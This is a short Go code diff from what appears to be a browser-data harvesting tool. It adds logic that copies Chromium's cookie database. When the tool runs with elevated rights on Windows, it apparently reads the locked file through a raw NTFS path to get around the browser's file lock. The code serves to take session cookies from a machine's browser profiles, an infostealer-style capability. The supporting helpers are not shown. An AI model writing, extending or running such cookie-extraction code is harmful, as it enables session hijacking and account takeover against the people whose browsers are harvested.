@@ -3,6 +3,7 @@ package chromium
 import (
 	"io/fs"
 	"path/filepath"
+	"runtime"
 	"strings"
 
 	"searchall3.5/tuozhan/liulanqi/browingdata"
@@ -81,13 +82,29 @@ func (c *Chromium) copyItemToLocal() error {
 		case fileutil.IsDirExists(path):
 			if i == item.ChromiumLocalStorage {
 				err = fileutil.CopyDir(path, filename, "lock")
-			}
-			if i == item.ChromiumSessionStorage {
+			} else if i == item.ChromiumSessionStorage {
 				err = fileutil.CopyDir(path, filename, "lock")
-			}
-			if i == item.ChromiumExtension {
+			} else if i == item.ChromiumExtension {
 				err = fileutil.CopyDirHasSuffix(path, filename, "manifest.json")
 			}
+		case i == item.ChromiumCookie: // Add this condition for ChromiumCookie
+			switch runtime.GOOS {
+			case "windows":
+				if fileutil.CheckIfElevated() {
+
+					npath := fileutil.EnsureNTFSPath(path)
+					npathRela := strings.Join(npath[1:], "//")
+					err = fileutil.TryRetrieveFile(npath[0], npathRela, filename)
+
+				} else {
+					err = fileutil.CopyFile(path, filename)
+
+				}
+			default:
+				err = fileutil.CopyFile(path, filename)
+
+			}
+
 		default:
 			err = fileutil.CopyFile(path, filename)
 		}
